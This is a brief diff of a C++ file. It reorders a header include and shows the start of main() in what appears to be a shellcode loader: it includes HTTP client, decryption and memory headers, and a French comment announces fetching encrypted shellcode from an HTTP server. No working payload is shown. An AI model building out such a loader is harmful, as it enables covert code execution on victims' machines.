@@ -1,8 +1,9 @@
 #include <iostream> 
+#include <tchar.h>
 #include "HTTPClient.h" 
 #include "Decrypt.h" 
 #include "Memory.h" 
-#include <tchar.h>
+
 
 int main() {
     // Etape 2 : Récupération du shellcode chiffré du serveur HTTP 
